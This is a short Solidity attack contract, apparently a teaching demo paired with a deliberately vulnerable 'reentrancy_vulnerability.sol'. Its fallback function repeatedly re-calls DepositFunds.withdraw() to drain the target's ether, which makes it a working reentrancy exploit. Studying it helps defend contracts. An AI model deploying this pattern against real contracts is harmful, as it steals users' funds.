// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
import "./reentrancy_vulnerability.sol";

contract Attack {
    //DepositFunds 是从要攻击合约中import来的类型
    // 在部署的时候会把要攻击合约的地址传入，记为depositFunds
    DepositFunds public depositFunds;

    constructor(address _depositFundsAddress) {
        depositFunds = DepositFunds(_depositFundsAddress);
    }

    // Fallback is called when DepositFunds sends Ether to this contract.
    fallback() external payable {
        if (address(depositFunds).balance >= 1 ether) {
            depositFunds.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        depositFunds.deposit{value: 1 ether}();
        depositFunds.withdraw();
    }


}
